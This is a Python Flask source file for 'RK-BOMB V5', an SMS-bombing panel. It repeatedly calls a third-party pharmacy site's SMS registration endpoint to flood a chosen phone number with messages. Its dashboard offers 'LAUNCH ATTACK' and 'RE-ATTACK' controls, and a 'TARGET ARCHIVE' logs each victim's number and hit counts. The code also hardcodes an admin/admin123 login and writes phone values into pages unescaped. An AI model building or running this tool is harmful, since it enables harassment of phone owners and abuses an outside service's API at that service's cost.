import requests
import threading
import os
import time
import sqlite3
import random
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ---------- DATABASE SETUP ----------
def get_db():
    conn = sqlite3.connect('rk_v5_ultimate.db', check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, phone TEXT, 
            success INTEGER, fail INTEGER, total INTEGER, limit_amt INTEGER, 
            status TEXT, start_time TEXT, stop_time TEXT, duration TEXT, 
            date_str TEXT, timestamp DATETIME)''')
        conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT UNIQUE, password TEXT, status TEXT)")
        try:
            conn.execute("INSERT INTO users VALUES (?, ?, ?)", ("admin", generate_password_hash("admin123"), "active"))
        except: pass

init_db()

# ---------- BOMBING ENGINE ----------
active_sessions = {}

def bombing_task(username, phone, limit, start_dt):
    key = f"{username}_{phone}"
    api_list = ["https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber={}"]

    while key in active_sessions:
        curr = active_sessions[key]
        if curr['total'] >= curr['limit'] or curr['status'] == 'Stopped': break
        
        if curr['status'] == 'Running':
            try:
                res = requests.get(random.choice(api_list).format(phone), timeout=8)
                if res.status_code == 200:
                    active_sessions[key]['success'] += 1
                    active_sessions[key]['new_hit'] = True
                else:
                    active_sessions[key]['fail'] += 1
            except:
                active_sessions[key]['fail'] += 1
            
            active_sessions[key]['total'] += 1
            time.sleep(1.5)
        else:
            time.sleep(1)

    stop_dt = datetime.now()
    duration = str(stop_dt - start_dt).split('.')[0]
    s = active_sessions.get(key)
    if s:
        with get_db() as conn:
            conn.execute('''INSERT INTO history 
                (username, phone, success, fail, total, limit_amt, status, start_time, stop_time, duration, date_str, timestamp) 
                VALUES (?,?,?,?,?,?,?,?,?,?,?,?)''',
                (username, phone, s['success'], s['fail'], s['total'], s['limit'], "Completed", 
                 s['start_time'], stop_dt.strftime("%I:%M %p"), duration, start_dt.strftime("%d/%m/%Y"), start_dt))
        del active_sessions[key]

# ---------- UI LAYOUT WITH ANIMATIONS ----------
LAYOUT = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RK-BOMB V5 ULTIMATE</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon: #00ffcc; --bg: #030303; --card: #0a0a0a; --red: #ff3366; --yellow: #ffcc00; --blue: #00ccff; --glass: rgba(255, 255, 255, 0.05); }
        body { background: var(--bg); color: var(--neon); font-family: 'Rajdhani', sans-serif; margin: 0; overflow-x: hidden; }
        
        /* Animations */
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes pulseNeon { 0% { box-shadow: 0 0 5px var(--neon); } 50% { box-shadow: 0 0 20px var(--neon); } 100% { box-shadow: 0 0 5px var(--neon); } }
        @keyframes slideIn { from { transform: translateX(-100%); } to { transform: translateX(0); } }

        .nav { background: #000; padding: 15px 25px; border-bottom: 1px solid var(--neon); display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:1000; box-shadow: 0 0 20px rgba(0,255,204,0.1); }
        .logo { font-family: 'Orbitron'; font-weight: 700; font-size: 1.3rem; letter-spacing: 2px; }
        
        .container { padding: 20px; max-width: 700px; margin: auto; animation: fadeIn 0.8s ease-out; }
        
        .stats-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 20px; }
        .stat-box { background: var(--glass); border: 1px solid #222; padding: 15px; border-radius: 12px; text-align: center; }
        .stat-box h4 { margin: 0; font-size: 0.8rem; color: #aaa; text-transform: uppercase; }
        .stat-box p { margin: 5px 0 0; font-family: 'Orbitron'; font-size: 1.2rem; font-weight: bold; }

        .card { background: var(--card); border: 1px solid #1a1a1a; border-radius: 18px; padding: 25px; margin-bottom: 20px; position: relative; overflow: hidden; }
        .card::before { content: ""; position: absolute; top: 0; left: 0; width: 4px; height: 100%; background: var(--neon); }
        
        input { width: 100%; padding: 14px; margin: 12px 0; background: #000; border: 1px solid #222; color: #fff; border-radius: 10px; box-sizing: border-box; outline: none; transition: 0.3s; font-family: 'Rajdhani'; font-size: 1rem; }
        input:focus { border-color: var(--neon); background: #050505; }
        
        .fire-btn { background: var(--neon); color: #000; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-family: 'Orbitron'; font-size: 0.9rem; transition: 0.3s; animation: pulseNeon 2s infinite; }
        .fire-btn:hover { transform: translateY(-2px); opacity: 0.9; }

        .live-card { border-left: 4px solid var(--blue); animation: slideIn 0.4s ease-out; background: linear-gradient(145deg, #0a0a0a, #111); }
        .prog-bg { background: #111; height: 8px; border-radius: 4px; margin: 15px 0; overflow: hidden; }
        .prog-bar { background: linear-gradient(90deg, var(--neon), var(--blue)); height: 100%; width: 0%; transition: 0.5s ease-in-out; }
        
        .badge { padding: 4px 10px; border-radius: 6px; font-size: 10px; font-weight: bold; font-family: 'Orbitron'; }
        .bg-running { background: rgba(0, 204, 255, 0.1); color: var(--blue); border: 1px solid var(--blue); }
        .bg-success { background: rgba(0, 255, 204, 0.1); color: var(--neon); border: 1px solid var(--neon); }
        .bg-fail { background: rgba(255, 51, 102, 0.1); color: var(--red); border: 1px solid var(--red); }

        .search-bar { margin-bottom: 15px; position: relative; }
        .nav-links a { color: #fff; text-decoration: none; margin-left: 20px; font-size: 0.9rem; font-weight: bold; transition: 0.3s; }
        .nav-links a:hover { color: var(--neon); }

        .timer { font-family: 'Orbitron'; font-size: 0.8rem; color: var(--yellow); }
    </style>
</head>
<body>
    <audio id="snd_hit" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
    <audio id="snd_start" src="https://assets.mixkit.co/active_storage/sfx/2571/2571-preview.mp3"></audio>

    <nav class="nav">
        <div class="logo">RK-BOMB <span style="color:#fff">V5</span></div>
        <div class="nav-links">
            <a href="/dashboard">DASHBOARD</a>
            <a href="/history">ARCHIVE</a>
            <a href="/logout" style="color:var(--red)">LOGOUT</a>
        </div>
    </nav>

    <div class="container">[CONTENT]</div>

    <script>
        function playSnd(id) { let s = document.getElementById(id); if(s){ s.currentTime=0; s.play().catch(e=>{}); } }
        
        function updateLive() {
            let engine = document.getElementById('live-engine');
            if(!engine) return;
            fetch('/api/status').then(r=>r.json()).then(data=>{
                let html = '';
                for(let k in data){
                    let s = data[k];
                    if(s.new_hit) playSnd('snd_hit');
                    let p = (s.total/s.limit)*100;
                    html += `
                    <div class="card live-card">
                        <div style="display:flex; justify-content:space-between; align-items:center;">
                            <b>📱 ${s.phone}</b>
                            <span class="badge bg-running">${s.status}</span>
                        </div>
                        <div class="prog-bg"><div class="prog-bar" style="width:${p}%"></div></div>
                        <div style="display:grid; grid-template-columns: repeat(3, 1fr); gap:10px; font-size:12px; text-align:center;">
                            <div><span style="color:var(--neon)">✔ Success</span><br>${s.success}</div>
                            <div><span style="color:var(--red)">✘ Fail</span><br>${s.fail}</div>
                            <div><span style="color:var(--blue)">⏳ Total</span><br>${s.total}/${s.limit}</div>
                        </div>
                        <div style="margin-top:15px; display:flex; justify-content:space-between; align-items:center;">
                            <span class="timer">🕒 Start: ${s.start_time}</span>
                            <div style="display:flex; gap:5px;">
                                <button onclick="location.href='/api/control?num=${s.phone}&action=${s.status==='Running'?'Paused':'Running'}'" style="background:var(--yellow); border:none; border-radius:5px; padding:5px 10px; cursor:pointer; font-weight:bold;">${s.status==='Running'?'PAUSE':'RESUME'}</button>
                                <button onclick="location.href='/api/stop?num=${s.phone}'" style="background:var(--red); color:white; border:none; border-radius:5px; padding:5px 10px; cursor:pointer; font-weight:bold;">STOP</button>
                            </div>
                        </div>
                    </div>`;
                }
                engine.innerHTML = html;
            });
        }
        setInterval(updateLive, 2000);

        function searchHistory() {
            let input = document.getElementById('searchInput').value.toLowerCase();
            let cards = document.getElementsByClassName('history-item');
            for (let i = 0; i < cards.length; i++) {
                let text = cards[i].innerText.toLowerCase();
                cards[i].style.display = text.includes(input) ? "block" : "none";
            }
        }
    </script>
</body>
</html>
'''

# ---------- ROUTES ----------
@app.route('/')
def root(): return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        with get_db() as conn:
            user = conn.execute("SELECT * FROM users WHERE username=?", (u,)).fetchone()
        if user and check_password_hash(user['password'], p):
            session['user'] = u
            return redirect(url_for('dashboard'))
    return render_template_string(LAYOUT.replace('[CONTENT]', '''
        <div class="card" style="text-align:center; animation: fadeIn 1s;">
            <h2 style="font-family:'Orbitron'; color:var(--neon);">SYSTEM ACCESS</h2>
            <form method="POST">
                <input name="u" placeholder="Identity" required>
                <input name="p" type="password" placeholder="Pass-Key" required>
                <button class="fire-btn">INITIALIZE</button>
            </form>
        </div>
    '''))

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template_string(LAYOUT.replace('[CONTENT]', '''
        <div class="stats-grid">
            <div class="stat-box"><h4>Active Attacks</h4><p id="act-count">0</p></div>
            <div class="stat-box"><h4>Server Status</h4><p style="color:var(--neon)">ONLINE</p></div>
        </div>
        <div class="card">
            <h3 style="margin:0 0 15px 0;">🚀 ATTACK MODULE</h3>
            <form action="/api/start" onsubmit="playSnd('snd_start')">
                <input name="num" placeholder="Target Phone Number" required>
                <input name="amt" type="number" placeholder="Hit Limit (e.g. 100)" required>
                <button class="fire-btn">LAUNCH ATTACK</button>
            </form>
        </div>
        <div id="live-engine"></div>
    '''))

@app.route('/history')
def history():
    if 'user' not in session: return redirect(url_for('login'))
    with get_db() as conn:
        groups = conn.execute("SELECT phone, COUNT(*) as sessions, SUM(success) as total_success FROM history GROUP BY phone ORDER BY id DESC").fetchall()
    
    html = '''
    <div class="search-bar">
        <input type="text" id="searchInput" onkeyup="searchHistory()" placeholder="Search target number...">
    </div>
    <h3>📜 TARGET ARCHIVE</h3>'''
    for g in groups:
        html += f'''
        <div class="card history-item" style="padding:15px; border-left:4px solid var(--blue);">
            <div style="display:flex; justify-content:space-between; align-items:center;">
                <a href="/history/{g['phone']}" style="font-size:1.1rem; color:var(--neon); font-weight:bold;">📱 {g['phone']}</a>
                <span class="badge bg-success">{g['total_success']} Hits</span>
            </div>
            <div style="margin-top:10px; display:flex; justify-content:space-between; align-items:center;">
                <span style="font-size:12px; color:#666;">Total Sessions: {g['sessions']}</span>
                <button class="fire-btn" style="width:auto; padding:5px 15px; font-size:10px;" onclick="location.href='/api/start?num={g['phone']}&amt=50'">RE-ATTACK</button>
            </div>
        </div>'''
    return render_template_string(LAYOUT.replace('[CONTENT]', html))

@app.route('/history/<phone>')
def history_detail(phone):
    if 'user' not in session: return redirect(url_for('login'))
    with get_db() as conn:
        details = conn.execute("SELECT * FROM history WHERE phone=? ORDER BY timestamp DESC", (phone,)).fetchall()
    
    html = f'<h3 style="color:var(--blue)">MISSION LOGS: {phone}</h3>'
    html += '<a href="/history" style="color:#666; font-size:13px;">← BACK TO LIST</a><br><br>'
    for d in details:
        html += f'''
        <div class="card history-item" style="font-size:13px; margin-bottom:10px; background:rgba(255,255,255,0.02);">
            <div style="display:flex; justify-content:space-between; color:#fff;">
                <b>{d['date_str']}</b> <span>{d['start_time']}</span>
            </div>
            <div style="margin-top:8px; display:grid; grid-template-columns:1fr 1fr; gap:5px;">
                <span class="badge bg-success">Success: {d['success']}</span>
                <span class="badge bg-fail">Fail: {d['fail']}</span>
            </div>
            <div style="margin-top:8px; color:#888;">Duration: {d['duration']} | Target: {d['limit_amt']}</div>
        </div>'''
    return render_template_string(LAYOUT.replace('[CONTENT]', html))

# ---------- API & CONTROL ----------
@app.route('/api/start')
def api_start():
    u, num, amt = session.get('user'), request.args.get('num'), request.args.get('amt')
    if u and num and amt:
        now = datetime.now()
        active_sessions[f"{u}_{num}"] = {
            'phone': num, 'success': 0, 'fail': 0, 'total': 0, 'limit': int(amt), 
            'status': 'Running', 'start_time': now.strftime("%I:%M %p"), 'new_hit': False
        }
        threading.Thread(target=bombing_task, args=(u, num, int(amt), now), daemon=True).start()
    return redirect(url_for('dashboard'))

@app.route('/api/status')
def api_status():
    u = session.get('user', '')
    data = {k: v for k, v in active_sessions.items() if k.startswith(u)}
    res = jsonify(data)
    for k in data: active_sessions[k]['new_hit'] = False
    return res

@app.route('/api/control')
def api_control():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = request.args.get('action')
    return redirect(url_for('dashboard'))

@app.route('/api/stop')
def api_stop():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = 'Stopped'
    return redirect(url_for('dashboard'))

@app.route('/logout')
def logout(): session.clear(); return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
